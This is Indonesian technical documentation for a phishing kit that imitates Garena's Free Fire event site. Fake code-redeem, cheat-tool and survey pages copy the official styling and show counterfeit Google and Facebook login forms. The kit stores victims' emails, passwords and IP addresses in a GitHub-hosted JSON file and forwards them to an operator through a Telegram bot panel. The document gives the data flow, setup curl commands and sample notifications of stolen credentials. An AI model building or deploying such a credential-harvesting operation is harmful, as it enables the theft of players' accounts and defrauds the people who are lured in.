# 📚 Materi Info — FF Kickoff Event 2026

Dokumen ini berisi penjelasan teknis mendetail tentang cara kerja setiap komponen proyek.

---

## 🏗️ Arsitektur Sistem

```
[ Browser Korban ]
      │
      │  GET /index.html, /coderedem.html, /aimlock.html
      │  POST /api/login  ──────────────────────────────────┐
      ▼                                                       │
[ Express Server ]                                           │
      │                                                       │
      ├── Static files (HTML/CSS/JS)                         │
      │                                                       ▼
      └── /api/login ─────── GitHub Contents API ──► data/logins.json
                    │
                    └────── Telegram Bot API ──► Notifikasi Admin

[ Admin via Telegram ]
      │
      ▼
[ Webhook /api/webhook ] ◄── Telegram push
      │
      └── Panel: lihat data, statistik, export, hapus
```

---

## 🔄 Alur Data Login

### Saat pengguna submit form:

1. **Browser** kirim `POST /api/login` dengan payload JSON:
   ```json
   {
     "page":     "redeem",
     "method":   "Google",
     "email":    "user@gmail.com",
     "password": "password123",
     "nickname": "PlayerXYZ",
     "uid":      "123456789",
     "level":    "52"
   }
   ```

2. **Server** tambah metadata:
   - `ip` — IP address pengguna dari header request
   - `ts` — timestamp Unix (ms) saat diterima

3. **GitHub DB** — record baru di-prepend ke `logins.json`, lalu di-commit

4. **Telegram** — notifikasi langsung dikirim ke chat admin:
   ```
   🎁 LOGIN REDEEM MASUK!
   ━━━━━━━━━━━━━━━━━━━━━━━
   🎁 Halaman   : Code Redeem
   🔵 Metode    : Google
   📧 Email     : user@gmail.com
   🔑 Password  : password123
   👤 Nickname  : PlayerXYZ
   🆔 UID       : 123456789
   🏆 Level     : 52
   🌐 IP        : 103.x.x.x
   🕐 Waktu     : 15/06/26, 14.22.05 WIB
   ```

---

## 🗄️ GitHub Database — Detail Teknis

### Kenapa GitHub?
- **Persistent** — data tidak hilang saat Vercel/Replit restart
- **Gratis** — tanpa biaya database
- **API tersedia** — GitHub Contents API memungkinkan CRUD file via HTTP

### Cara kerja `ghLoadData()`:
```
1. Cek cache in-memory (TTL 15 detik)
2. Jika cache expired → GET /repos/.../contents/data/logins.json
3. Decode content dari Base64 → parse JSON
4. Simpan SHA file (wajib untuk update berikutnya)
5. Return array data
```

### Cara kerja `ghSaveData(arr)`:
```
1. Encode JSON → Base64
2. PUT /repos/.../contents/data/logins.json
   Body: { message, content (base64), sha (dari load sebelumnya) }
3. Update cache SHA dari response
```

> ⚠️ SHA **wajib** disertakan saat update — tanpa SHA, GitHub API tolak request (409 Conflict)

### Batas kapasitas:
- Maksimal **5.000 record** (trim otomatis saat melebihi)
- Ukuran file JSON ≈ 1 KB per record → max ~5 MB
- Rate limit GitHub API: 5.000 request/jam (token auth)

---

## 🤖 Telegram Bot — Detail Teknis

### Setup Webhook
Bot menggunakan **webhook** (bukan polling) agar real-time:
```
POST https://api.telegram.org/bot<TOKEN>/setWebhook
Body: { url: "https://<domain>/api/webhook" }
```

Endpoint `/api/webhook` di server menerima update dari Telegram.

### Struktur Update Handler:
```
handleUpdate(update)
  ├── update.message  → perintah teks (/start, /data, dll)
  └── update.callback_query → tombol inline keyboard
```

### Inline Keyboard Navigation:
Semua menu admin menggunakan `inline_keyboard` dengan `callback_data`:
- `menu` — kembali ke menu utama
- `data_0`, `data_1`, ... — paginasi data (5 per halaman)
- `stats` — halaman statistik
- `export` — export data
- `database` — info database
- `confirm_clear` → `do_clear` — konfirmasi hapus
- `search_prompt` — prompt cari data

### Search Mode:
Server menyimpan state pencarian per user di `_searchState` (Map):
```javascript
_searchState.set(chatId, { waiting: true, ts: Date.now() })
// Expired otomatis setelah 5 menit
```

---

## 🎨 Desain Halaman — Garena Style

### Identitas Visual (dari situs asli ff.garena.com):
| Elemen         | Nilai                                           |
|----------------|-------------------------------------------------|
| Background     | `#080808` (hampir hitam)                        |
| Aksen utama    | `#FFBA00` (gold Garena)                         |
| Aksen sekunder | `#FFAF00` (gold sedikit lebih oranye)           |
| Oranye aksi    | `#FF6B00`                                       |
| Hijau status   | `#00C853`                                       |
| Card background| `#111111`, `#161616`                            |
| Font headline  | Orbitron (bold), Rajdhani (semi-bold)           |
| Font body      | Inter                                           |

### SVG Dekorasi (disalin dari kode asli ff.garena.com):
```svg
<svg viewBox="0 0 1440 25" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 23.69H248.724L270.737 5.17C272.873 3.04 275.77 1.83 278.792 1.83H1440"
        stroke="#FFAF00" stroke-width="2" stroke-miterlimit="10"/>
  <path d="M248.546 23.33H0V18.7H253.887L248.546 23.33Z" fill="#FFAF00"/>
</svg>
```
Ini adalah dekorasi polygon emas yang digunakan di header section situs resmi.

### Gambar dari Garena CDN:
| Asset                  | URL CDN                                                                 |
|------------------------|-------------------------------------------------------------------------|
| Ikon FF (48×48)        | `https://dl.dir.freefiremobile.com/common/web_event/common/images/logo.png` |
| Logo FF penuh          | `https://dl.dir.freefiremobile.com/.../full_logo.969f536.png`           |
| Hero Fire Kickoff      | `/attached_assets/ff-kickoff.jpg` (1920×1080, 742 KB)                  |
| Event 2                | `/attached_assets/ff-event2.jpg`  (1920×1080, 766 KB)                  |
| Event 3                | `/attached_assets/ff-event3.jpg`  (1920×1080, 755 KB)                  |
| Character background   | `/attached_assets/ff-chars-bg.jpg` (1440×900, 17 KB)                   |

---

## 📄 Halaman Per Halaman

### `index.html` — Landing Menu
- Sticky navbar: logo CDN + "FREE FIRE" (Orbitron) + tombol DOWNLOAD
- Hero banner: `ff-kickoff.jpg` dengan overlay gradient ke bawah
- SVG polygon emas (dari kode asli Garena)
- Stats bar: 1.2M+ Pemain · OB53 · 4.8★ · ONLINE
- Dua event card: Code Redeem & Tool FF (dengan thumbnail berbeda)
- News strip: 3 artikel dengan link ke garena.com asli
- Footer: logo Garena + copyright

### `coderedem.html` — Code Redeem
- Hero + animasi kode palsu (6 box input karakter)
- Daftar hadiah: M1887, Bundle, Diamond ×500, dll
- Tombol "Klaim Sekarang" → trigger modal login
- Modal login Google / Facebook (tampilan menyerupai asli)
- POST `/api/login` dengan `page: "redeem"`
- Toast notifikasi di bawah layar (mobile-safe dengan `env(safe-area-inset-bottom)`)

### `aimlock.html` — Tool FF
- Server status strip (hijau: ONLINE, Anti-Ban Aktif, OB53 Compatible)
- Hero: stats 1.2M download · 4.9★ · OB53 · 0 Ban Report
- 4 tool cards: Aim Lock Pro, Auto Headshot, Anti-Detect Shield, Speed Boost
- Tombol Download → modal login Google / Facebook
- POST `/api/login` dengan `page: "aimlock"`
- Changelog OB53: tabel kompatibilitas + 2 versi changelog realistis
- Toast notifikasi mobile-safe

### `survey.html` — Kuesioner
- 5 pertanyaan multi-choice tentang Free Fire
- Animasi progress bar
- Halaman hasil dengan "reward" palsu

---

## 🔔 Format Notifikasi Telegram

### Login dari halaman Redeem:
```
🎁 LOGIN REDEEM MASUK!
━━━━━━━━━━━━━━━━━━━━━━━
🎁 Halaman   : Code Redeem
🔵 Metode    : Google
📧 Email     : korban@gmail.com
🔑 Password  : p4ssword!
👤 Nickname  : ProPlayer99
🆔 UID       : 9876543210
🏆 Level     : 67
🌐 IP        : 114.xx.xx.xx
🕐 Waktu     : 15/06/26, 14.22.05 WIB
━━━━━━━━━━━━━━━━━━━━━━━
📊 Data ke-142 · 🎁 REDEEM
```

### Login dari halaman Aimlock:
```
🎯 LOGIN AIMLOCK MASUK!
━━━━━━━━━━━━━━━━━━━━━━━
🎯 Halaman   : Aim Lock / Tool FF
🔷 Metode    : Facebook
📧 Email     : korban@yahoo.com
🔑 Password  : qwerty123
🌐 IP        : 180.xx.xx.xx
🕐 Waktu     : 15/06/26, 15.10.44 WIB
━━━━━━━━━━━━━━━━━━━━━━━
📊 Data ke-143 · 🎯 AIMLOCK
```

> Catatan: Login aimlock **tidak** menyertakan nickname/UID/level karena tidak ada input tersebut di halaman tersebut.

---

## 🔧 Konfigurasi Lanjutan

### Mengubah Token Telegram via API (tanpa restart):
```bash
curl -X POST https://<domain>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"tgToken":"123456:ABC-DEF","tgChat":"987654321"}'
```

### Mendaftarkan Webhook Telegram:
```bash
curl "https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://<domain>/api/webhook"
```

### Cek status webhook:
```bash
curl "https://api.telegram.org/bot<TOKEN>/getWebhookInfo"
```

---

## 📊 Struktur Data Login (`logins.json`)

```json
[
  {
    "page":     "redeem",
    "method":   "Google",
    "email":    "korban@gmail.com",
    "password": "p4ssword",
    "nickname": "ProPlayer",
    "uid":      "9876543210",
    "level":    "67",
    "ip":       "114.10.x.x",
    "ts":       1750000000000
  },
  {
    "page":     "aimlock",
    "method":   "Facebook",
    "email":    "korban2@yahoo.com",
    "password": "secret123",
    "nickname": "",
    "uid":      "",
    "level":    "",
    "ip":       "180.252.x.x",
    "ts":       1749999000000
  }
]
```

Field `ts` adalah Unix timestamp dalam milidetik (JavaScript `Date.now()`).

---

## 📋 Versi & Referensi

| Item               | Detail                                          |
|--------------------|-------------------------------------------------|
| Versi Bot          | 3.0                                             |
| Versi Game Target  | OB53 (Undersea Mystery — April 2026)           |
| Event Referensi    | Fire Kickoff (mulai 5 Juni 2026)                |
| Node.js            | 20.x LTS                                        |
| Express            | 4.18.x                                          |
| GitHub API         | v3 (REST) — Contents API                        |
| Telegram Bot API   | v7.x                                            |
